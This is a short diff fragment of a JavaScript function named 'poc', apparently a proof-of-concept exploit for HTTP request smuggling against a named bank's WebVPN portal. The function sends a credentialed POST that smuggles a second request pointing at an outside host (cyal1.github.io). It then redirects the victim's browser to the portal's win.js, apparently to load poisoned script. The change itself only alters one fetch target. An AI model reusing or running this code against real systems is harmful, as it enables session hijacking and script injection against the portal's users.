@@ -36,7 +36,7 @@ function poc(){
 		// expiress = new Date();
 		// expiress.setTime(today.getTime()+ 1000*60*60*72);
 		document.cookie="isvisted=true; max-age="+60*2+";";
-		fetch("https://vpn.webank.com/");
+		fetch("https://vpn.webank.com/favicon.ico");
 		fetch('https://vpn.webank.com/',
 		 {method: 'POST', body: "GET /+webvpn+/ HTTP/1.1\r\nHost: cyal1.github.io\r\nX: Y", credentials: 'include'}).catch(() => {
 		  location='https://vpn.webank.com/+CSCOE+/win.js' 
